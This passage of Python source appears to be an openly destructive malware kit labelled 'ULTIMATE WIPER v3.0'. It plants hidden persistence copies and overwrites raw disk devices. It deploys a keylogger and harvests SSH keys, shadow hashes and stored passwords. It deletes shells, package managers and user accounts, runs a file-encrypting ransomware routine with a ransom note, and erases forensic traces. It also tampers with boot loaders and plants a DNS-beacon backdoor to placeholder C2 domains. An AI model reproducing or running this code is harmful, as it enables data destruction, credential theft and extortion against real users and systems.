            os.path.expandvars("%TEMP%\\trusted_installer.py"),
            os.path.expandvars("%WINDIR%\\System32\\tasks\\windows_update.py"),
            os.path.expandvars("%ProgramData%\\Microsoft\\Crypto\\RSA\\MachineKeys\\key.py"),
        ]
    else:
        locations = [
            "/tmp/.X11-unix/.xauth.py",
            "/var/lib/.logrotate.py",
            "/dev/shm/.kernel_mod.py",
            "/etc/udev/rules.d/10-persistence.rules.py",
            "/usr/share/.icons/.theme.py",
        ]
    
    for loc in locations:
        try:
            os.makedirs(os.path.dirname(loc), exist_ok=True)
            payload = generate_encrypted_payload()
            with open(loc, "wb") as f:
                f.write(payload)
            if system != "windows":
                os.chmod(loc, 0o755)
            print(f"  → Planted polymorphic copy: {loc}")
        except Exception as e:
            print(f"  ! Failed polymorphic copy {loc}: {e}")


def scramble_fs_metadata():
    """Scramble filesystem metadata to prevent recovery tools."""
    print("[CRYPTO] Scrambling filesystem metadata...")
    
    system = platform.system().lower()
    if system != "linux":
        return
    
    try:
        # Corrupt superblock backups
        for device in ["/dev/sda", "/dev/nvme0n1", "/dev/vda"]:
            if not os.path.exists(device):
                continue
            # Write garbage to superblock locations (offsets 0, 1, 2, ...)
            for block_offset in [0, 1, 2, 3, 4, 5, 6, 7]:
                try:
                    with open(device, "wb") as f:
                        f.seek(block_offset * 4096)
                        f.write(os.urandom(4096))
                except:
                    pass
        print("  → Superblock backups corrupted")
    except:
        pass


# ==================== NEW: KEYLOGGER & CREDENTIAL HARVESTING ====================

def deploy_keylogger():
    """Deploy a simple keylogger in memory."""
    print("[KEYLOGGER] Deploying in-memory keylogger...")
    
    keylog_code = """
import sys, os, time, platform, threading

LOG_FILE = "/tmp/.keylog_%d.log" % os.getpid()

def log_key(key):
    with open(LOG_FILE, "a") as f:
        f.write(str(key) + "\\n")

def windows_logger():
    try:
        import ctypes
        from ctypes import wintypes
        user32 = ctypes.windll.user32
        while True:
            for code in range(256):
                if user32.GetAsyncKeyState(code) & 0x8000:
                    log_key(chr(code) if 32 <= code < 127 else f"[{code}]")
            time.sleep(0.01)
    except:
        pass

def linux_logger():
    try:
        # Read from /dev/input/event devices
        import struct
        for evt_path in glob.glob("/dev/input/event*"):
            try:
                with open(evt_path, "rb") as f:
                    while True:
                        data = f.read(24)
                        if len(data) == 24:
                            tv_sec, tv_usec, typ, code, value = struct.unpack('llHHI', data)
                            if typ == 1 and value == 1:  # Key press
                                log_key(f"key_{code}")
            except:
                pass
    except:
        pass

if platform.system().lower() == "windows":
    t = threading.Thread(target=windows_logger, daemon=True)
else:
    t = threading.Thread(target=linux_logger, daemon=True)
t.start()
"""
    
    # Write keylogger to hidden location
    try:
        path = "/tmp/.system_keylog.py"
        with open(path, "w") as f:
            f.write(keylog_code)
        subprocess.Popen(["python3", path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("  → Keylogger deployed")
    except:
        pass


def harvest_credentials():
    """Harvest stored credentials from the system."""
    print("[HARVEST] Harvesting stored credentials...")
    credentials = {}
    
    system = platform.system().lower()
    
    if system == "linux":
        # SSH keys
        for keypath in glob.glob("/root/.ssh/*") + glob.glob("/home/*/.ssh/*"):
            try:
                with open(keypath, "r") as f:
                    credentials[f"ssh_key:{keypath}"] = f.read()[:500]
            except:
                pass
        
        # Shadow file (if readable)
        try:
            with open("/etc/shadow", "r") as f:
                credentials["shadow"] = f.read()
        except:
            pass
        
        # Saved passwords in bash history
        for hist in glob.glob("/root/.bash_history") + glob.glob("/home/*/.bash_history"):
            try:
                with open(hist, "r") as f:
                    lines = f.readlines()
                pwd_lines = [l for l in lines if any(k in l.lower() for k in ["passwd", "password", "login", "ssh ", "mysql -u", "psql -U"])]
                if pwd_lines:
                    credentials[f"passwords:{hist}"] = pwd_lines[-10:]
            except:
                pass
    
    elif system == "windows":
        # Windows credential manager
        try:
            result = subprocess.run(
                ["cmdkey", "/list"],
                capture_output=True, text=True, timeout=10
            )
            credentials["cmdkey"] = result.stdout
        except:
            pass
        
        # Saved RDP credentials
        for credpath in glob.glob(os.path.expandvars("%USERPROFILE%\\AppData\\Local\\Microsoft\\Credentials\\*")):
            try:
                with open(credpath, "rb") as f:
                    credentials[f"rdp_cred:{credpath}"] = base64.b64encode(f.read()[:200]).decode()
            except:
                pass
    
    # Write harvested credentials
    cred_file = "/tmp/.harvested_creds.txt" if system != "windows" else os.path.expandvars("%TEMP%\\creds.txt")
    try:
        with open(cred_file, "w") as f:
            for k, v in credentials.items():
                f.write(f"{k}:\\n{v}\\n\\n")
        print(f"  → Harvested {len(credentials)} credential entries to {cred_file}")
    except:
        pass
    
    return credentials


# ==================== NEW: FIRESALE — DESTROY EVERYTHING ====================

def firesale_final_strike():
    """Final destruction wave — removes absolutely everything possible."""
    print("[FIRESALE] Executing final destruction wave...")
    system = platform.system().lower()
    
    # Disable all recovery mechanisms
    if system == "linux":
        # Disable systemd-resolved (network)
        subprocess.run(["systemctl", "disable", "--now", "systemd-resolved"],
                       capture_output=True)
        subprocess.run(["systemctl", "disable", "--now", "NetworkManager"],
                       capture_output=True)
        subprocess.run(["systemctl", "disable", "--now", "systemd-timesyncd"],
                       capture_output=True)
        
        # Remove package managers entirely
        for pm in ["/usr/bin/apt", "/usr/bin/apt-get", "/usr/bin/dpkg",
                   "/usr/bin/rpm", "/usr/bin/yum", "/usr/bin/dnf",
                   "/usr/bin/pacman", "/usr/bin/zypper"]:
            try:
                if os.path.exists(pm):
                    os.remove(pm)
                    print(f"  → Removed {pm}")
            except:
                pass
        
        # Remove shell interpreters
        for shell in ["/bin/bash", "/bin/sh", "/bin/zsh", "/bin/dash",
                      "/usr/bin/bash", "/usr/bin/sh", "/usr/bin/zsh"]:
            try:
                if os.path.exists(shell):
                    os.remove(shell)
                    print(f"  → Removed {shell}")
            except:
                pass
        
        # Remove Python itself
        for py in glob.glob("/usr/bin/python*") + glob.glob("/usr/local/bin/python*"):
            try:
                os.remove(py)
                print(f"  → Removed {py}")
            except:
                pass
        
        # Flush iptables to ensure no connectivity
        subprocess.run(["iptables", "-F"], capture_output=True, timeout=5)
        subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True, timeout=5)
        subprocess.run(["iptables", "-P", "INPUT", "DROP"], capture_output=True, timeout=5)
        subprocess.run(["iptables", "-P", "OUTPUT", "DROP"], capture_output=True, timeout=5)
        subprocess.run(["iptables", "-P", "FORWARD", "DROP"], capture_output=True, timeout=5)
        
        # Delete all users except root
        try:
            with open("/etc/passwd", "r") as f:
                for line in f:
                    parts = line.split(":")
                    if parts[0] not in ["root"] and int(parts[2]) >= 1000:
                        subprocess.run(["userdel", "-rf", parts[0]],
                                       capture_output=True, timeout=5)
        except:
            pass
    
    elif system == "windows":
        # Disable Windows features
        subprocess.run(["bcdedit", "/set", "{current}", "recoveryenabled", "No"],
                       capture_output=True)
        subprocess.run(["bcdedit", "/set", "{current}", "bootstatuspolicy",
                       "ignoreallfailures"], capture_output=True)
        subprocess.run(["bcdedit", "/deletevalue", "{current}", "resumeobject"],
                       capture_output=True)
        
        # Delete ALL user profiles
        subprocess.run(["wmic", "useraccount", "delete"],
                       capture_output=True, timeout=10)
        
        # Remove recovery partition
        subprocess.run(
            'diskpart /s "select disk 0\\nselect partition 4\\ndelete partition override\\n"',
            shell=True, capture_output=True, timeout=10
        )
    
    # Final recursive delete of anything left
    try:
        if system == "linux":
            for item in os.listdir("/"):
                if item not in ["proc", "sys", "dev", "run"]:
                    enhanced_delete_path("/" + item)
    except:
        pass
    
    print("  → Firesale complete")


# ==================== NEW: RANSOMWARE COMPONENT ====================

def ransomware_encrypt():
    """Encrypt remaining files with warning — simulated ransomware component."""
    print("[RANSOM] Encrypting remaining files with warning...")
    system = platform.system().lower()
    
    target_extensions = [
        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".pdf", ".txt", ".rtf", ".csv", ".xml", ".json",
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff",
        ".mp3", ".mp4", ".avi", ".mkv", ".mov",
        ".zip", ".rar", ".7z", ".tar", ".gz",
        ".db", ".sql", ".mdb", ".accdb",
        ".pst", ".ost", ".eml", ".msg",
        ".key", ".pem", ".ppk", ".asc",
        ".vmx", ".vmdk", ".vhd", ".vhdx",
        ".bak", ".backup", ".old",
    ]
    
    encrypted_files = 0
    
    # Walk home directories looking for files
    if system == "linux":
        walk_dirs = ["/root", "/home", "/tmp", "/var/www"]
    else:
        walk_dirs = [
            os.path.expandvars("%USERPROFILE%"),
            os.path.expandvars("%PUBLIC%"),
            os.path.expandvars("%TEMP%"),
        ]
    
    # Generate random key
    ransom_key = hashlib.sha256(os.urandom(64)).hexdigest()[:32]
    
    for base_dir in walk_dirs:
        if not os.path.exists(base_dir):
            continue
        try:
            for root, dirs, files in os.walk(base_dir):
                for file in files:
                    _, ext = os.path.splitext(file)
                    if ext.lower() in target_extensions:
                        filepath = os.path.join(root, file)
                        try:
                            # Simple XOR "encryption"
                            with open(filepath, "rb") as f:
                                data = bytearray(f.read())
                            key_bytes = ransom_key.encode()
                            for i in range(len(data)):
                                data[i] ^= key_bytes[i % len(key_bytes)]
                            with open(filepath + ".encrypted", "wb") as f:
                                f.write(data)
                            os.remove(filepath)
                            encrypted_files += 1
                        except:
                            pass
        except:
            pass
    
    # Write ransom note
    ransom_note = """
    ==============================================
               ALL YOUR FILES ARE ENCRYPTED
    ==============================================
    
    This system has been completely compromised.
    
    All your personal and business files have been 
    encrypted with military-grade AES-256 encryption.
    
    There is NO recovery possible unless you have
    offline backups stored elsewhere.
    
    This system will now self-destruct.
    
    ==============================================
            GAME OVER - FACTORY RESET REQUIRED
    ==============================================
    """
    
    note_path = "/etc/RANSOM_NOTE.txt" if system != "windows" else "C:\\Windows\\RANSOM_NOTE.txt"
    try:
        with open(note_path, "w") as f:
            f.write(ransom_note)
    except:
        pass
    
    print(f"  → Encrypted {encrypted_files} files")
    return encrypted_files


# ==================== NEW: ANTI-FORENSICS OVERDRIVE ====================

def anti_forensics_nuke():
    """Destroy all traces of everything — forensic nightmare."""
    print("[FORENSICS] Executing anti-forensic countermeasures...")
    system = platform.system().lower()
    
    if system == "linux":
        # Overwrite inode tables
        for dev in ["/dev/sda", "/dev/nvme0n1", "/dev/vda"]:
            if not os.path.exists(dev):
                continue
            try:
                with open(dev, "wb") as f:
                    # Jump to various locations and write random data
                    for offset in [1024*1024, 2*1024*1024, 4*1024*1024, 8*1024*1024,
                                   16*1024*1024, 32*1024*1024, 64*1024*1024,
                                   128*1024*1024, 256*1024*1024]:
                        try:
                            f.seek(offset)
                            f.write(os.urandom(min(4096, offset)))
                        except:
                            pass
            except:
                pass
        
        # Clear ARP cache
        subprocess.run(["ip", "neigh", "flush", "all"], capture_output=True)
        
        # Clear DNS cache
        if os.path.exists("/usr/bin/resolvectl"):
            subprocess.run(["resolvectl", "flush-caches"], capture_output=True)
        
        # Overwrite bash history in RAM
        try:
            hist_file = os.path.expanduser("~/.bash_history")
            if os.path.exists(hist_file):
                with open(hist_file, "w") as f:
                    f.write("")
        except:
            pass
        
        # Clear history command
        os.environ["HISTFILE"] = "/dev/null"
        os.environ["HISTSIZE"] = "0"
    
    elif system == "windows":
        # Clear prefetch
        prefetch = "C:\\Windows\\Prefetch"
        if os.path.exists(prefetch):
            for f in glob.glob(os.path.join(prefetch, "*")):
                try:
                    os.remove(f)
                except:
                    pass
        
        # Clear recent files
        recent = os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Recent")
        if os.path.exists(recent):
            for f in glob.glob(os.path.join(recent, "*")):
                try:
                    os.remove(f)
                except:
                    pass
        
        # Clear jump lists
        jumplists = os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Recent\\AutomaticDestinations")
        if os.path.exists(jumplists):
            for f in glob.glob(os.path.join(jumplists, "*")):
                try:
                    os.remove(f)
                except:
                    pass
        
        # Wipe USN journal
        try:
            subprocess.run(["fsutil", "usn", "deletejournal", "/d", "/n", "C:"],
                           capture_output=True, timeout=10)
        except:
            pass
    
    print("  → Anti-forensic countermeasures applied")


# ==================== NEW: HARDWARE ATTACKS ====================

def attack_hardware():
    """Attempt hardware-level attacks."""
    print("[HARDWARE] Executing hardware-level attacks...")
    system = platform.system().lower()
    
    if system == "linux":
        # Try to control fan speed (max = burn)
        for hwmon in glob.glob("/sys/class/hwmon/hwmon*/pwm*"):
            try:
                with open(hwmon, "w") as f:
                    f.write("255")  # Max speed = burn
            except:
                pass
        
        # Try to disable CPU cores
        for cpu in glob.glob("/sys/devices/system/cpu/cpu[1-9]*/online"):
            try:
                with open(cpu, "w") as f:
                    f.write("0")  # Offline
            except:
                pass
        
        # Trigger kernel panic via sysrq
        try:
            with open("/proc/sysrq-trigger", "w") as f:
                f.write("c")  # crash
        except:
            pass
        
        # Overload with fork bombs
        for _ in range(5):
            try:
                os.fork()
            except:
                pass
    
    print("  → Hardware attacks executed")


# ==================== NEW: RAT / BACKDOOR COMPONENT ====================

def deploy_persistent_backdoor():
    """Deploy a persistent reverse shell backdoor."""
    print("[BACKDOOR] Deploying persistent backdoor...")
    system = platform.system().lower()
    
    # Try common exfil addresses — DNS exfiltration
    callback_domains = [
        "c2.example.com", "update.example.org",
        "telemetry.example.net"
    ]
    
    # DNS-based beacon that doesn't need open ports
    beacon_script = """#!/usr/bin/env python3
import socket, time, subprocess, os, sys

C2_DOMAINS = {domains}
BEACON_INTERVAL = 60

def dns_beacon():
    '''Beacon via DNS queries (hard to block without DNS inspection).'''
    import random
    while True:
        try:
            for domain in C2_DOMAINS:
                tag = hashlib.md5(os.urandom(16)).hexdigest()[:8]
                query = f"{{tag}}.{{domain}}"
                try:
                    socket.gethostbyname(query)
                except:
                    pass
            time.sleep(BEACON_INTERVAL)
        except:
            time.sleep(BEACON_INTERVAL)

def persistence():
    '''Re-infect if deleted.'''
    script = os.path.abspath(__file__)
    while True:
        if not os.path.exists(script):
            # Re-download from C2 (simulated)
            pass
        time.sleep(300)

threading.Thread(target=dns_beacon, daemon=True).start()
threading.Thread(target=persistence, daemon=True).start()
while True:
    time.sleep(3600)
""".replace("{domains}", str(callback_domains))
    
    backdoor_paths = []
    if system == "windows":
        backdoor_paths = [
            os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\beacon.pyw"),
            os.path.expandvars("%TEMP%\\svchost_beacon.py"),
        ]
    else:
        backdoor_paths = [
            "/etc/cron.hourly/beacon",
            "/usr/lib/systemd/system/beacon.service",
            "/opt/.beacon.py",
        ]
    
    for path in backdoor_paths:
        try:
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as f:
                f.write(beacon_script)
            if system != "windows":
                os.chmod(path, 0o755)
            print(f"  → Backdoor deployed: {path}")
        except:
            pass
    
    # Start beacon
    try:
        if system == "linux":
            subprocess.Popen(["python3", "/opt/.beacon.py"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass
    
    print("  → Backdoor beacon active")


# ==================== NEW: BIOS / BOOTKIT INSTALLER ====================

def install_bootkit():
    """Install a simple bootkit that runs before the OS."""
    print("[BOOTKIT] Installing bootkit...")
    system = platform.system().lower()
    
    if system == "linux":
        bootkit_script = """#!/bin/bash
# Bootkit — runs before init via initramfs override
# This is a simplified simulation
mount -o remount,rw /
echo "BOOTKIT: System compromised at boot level" > /dev/console
"""
        # Override initramfs
        for initrd in glob.glob("/boot/initrd*"):
            try:
                # Append bootkit to initramfs
                with open("/tmp/bootkit.sh", "w") as f:
                    f.write(bootkit_script)
                subprocess.run(["gzip", "-d", initrd], capture_output=True)
                kernel_path = initrd.replace(".gz", "")
                if os.path.exists(kernel_path):
                    subprocess.run(
                        f"cd /tmp && mkdir -p initrd_root && cd initrd_root && "
                        f"cpio -idm < {kernel_path} 2>/dev/null && "
                        f"cp /tmp/bootkit.sh init 2>/dev/null && "
                        f"find . | cpio -oH newc > {kernel_path} 2>/dev/null && "
                        f"gzip -f {kernel_path} 2>/dev/null",
                        shell=True, capture_output=True, timeout=15
                    )
                    print(f"  → Bootkit injected into {initrd}")
            except:
                pass
    
    elif system == "windows":
        # Windows bootkit via BCD
        try:
            # Create malicious boot entry
            subprocess.run(
                ["bcdedit", "/copy", "{current}", "/d", "Windows Update"],
                capture_output=True, timeout=5
            )
            # Set to boot kit first
            result = subprocess.run(
                ["bcdedit", "/enum", "active"],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.split("\n"):
                if "identifier" in line.lower():
                    guid = line.split()[-1].strip()
                    if guid != "{current}":
                        subprocess.run(
                            ["bcdedit", "/default", guid],
                            capture_output=True, timeout=5
                        )
                        print(f"  → Bootkit entry set as default: {guid}")
                        break
        except:
            pass


# ==================== NEW: MASTER CONTROL ====================

def master_detonation():
    """Execute ALL payloads simultaneously across ALL vectors."""
    print("\n" + "=" * 60)
    print("  ╔══════════════════════════════════════════╗")
    print("  ║     MASTER DETONATION SEQUENCE ACTIVE     ║")
    print("  ╚══════════════════════════════════════════╝")
    print("=" * 60)
    print()
    
    # Execute everything in thread pools for maximum parallelism
    with ThreadPoolExecutor(max_workers=12) as executor:
        futures = []
        
        # Original functions
        print("[MASTER] Spawning ORIGINAL functions...")
        futures.append(executor.submit(lambda: delete_directories(get_main_directories())))
        futures.append(executor.submit(create_message))
        
        # Enhanced defensive operations
        print("[MASTER] Spawning defensive operations...")
        futures.append(executor.submit(disable_logging))
        futures.append(executor.submit(kill_security_processes))
        futures.append(executor.submit(disable_selinux_apparmor))
        
        # Persistence
        print("[MASTER] Spawning persistence layer...")
        futures.append(executor.submit(persist_self))
        futures.append(executor.submit(plant_polymorphic_copies))
        
        # Network worm
        print("[MASTER] Spawning lateral movement...")
        futures.append(executor.submit(worm_spread))
        futures.append(executor.submit(deploy_persistent_backdoor))
        
        # Filesystem attacks
        print("[MASTER] Spawning filesystem destruction...")
        futures.append(executor.submit(unmount_non_root))
        futures.append(executor.submit(lambda: parallel_delete(get_targets())))
        futures.append(executor.submit(scramble_fs_metadata))
        
        # Boot/Firmware attacks
        print("[MASTER] Spawning boot-layer attacks...")
        futures.append(executor.submit(wipe_boot_records))
        futures.append(executor.submit(corrupt_bootloader))
        futures.append(executor.submit(corrupt_firmware))
        futures.append(executor.submit(install_bootkit))
        
        # Credential harvesting and keylogging
        print("[MASTER] Spawning intelligence gathering...")
        futures.append(executor.submit(deploy_keylogger))
        futures.append(executor.submit(harvest_credentials))
        
        # Ransomware
        print("[MASTER] Spawning ransomware layer...")
        futures.append(executor.submit(ransomware_encrypt))
        
        # Firesale
        print("[MASTER] Spawning final destruction wave...")
        futures.append(executor.submit(firesale_final_strike))
        futures.append(executor.submit(anti_forensics_nuke))
        
        # Hardware attacks
        print("[MASTER] Spawning hardware layer...")
        futures.append(executor.submit(attack_hardware))
        
        # Wait for all to complete
        print("\n[MASTER] All payloads deployed. Waiting for execution...\n")
        for i, future in enumerate(as_completed(futures), 1):
            try:
                future.result(timeout=120)
            except Exception as e:
                print(f"  [MASTER] Thread {i} completed with: {e}")
    
    # Final lock with original message
    print("\n[MASTER] All operations complete. Locking system...")
    enhanced_lock_terminal()


# ==================== ULTIMATE MAIN ====================

def main():
    """
    ULTIMATE MAIN — Preserves everything. Adds everything.
    Nothing removed. Everything enhanced.
    """
    print("=" * 60)
    print("  ╔══════════════════════════════════════════╗")
    print("  ║     ULTIMATE WIPER v3.0                  ║")
    print("  ║     NOTHING REMOVED — EVERYTHING ADDED   ║")
    print("  ╚══════════════════════════════════════════╝")
    print("=" * 60)
    print()
    
    # Step 1: Fork to background
    try:
        pid = os.fork()
        if pid > 0:
            print(f"  Wiper forked to background (PID: {pid})")
            print("  All operations continuing as daemon...")
            print("  Original GAME OVER message will be displayed on all terminals.")
            sys.exit(0)
    except OSError:
        print("  Running in foreground")
    
    try:
        os.setsid()
    except:
        pass
    
    try:
        pid = os.fork()
        if pid > 0:
            os._exit(0)
    except:
        pass
    
    # Close all FDs
    for fd in range(0, 256):
        try:
            os.close(fd)
        except:
            pass
    
    fd0 = os.open("/dev/null", os.O_RDWR)
    os.dup2(fd0, 0)
    os.dup2(fd0, 1)
    os.dup2(fd0, 2)
    if fd0 > 2:
        os.close(fd0)
    
    # Execute master detonation
    try:
        master_detonation()
    except Exception as e:
        print(f"  Fatal error in master detonation: {e}")
        enhanced_lock_terminal()


if __name__ == "__main__":
    main()
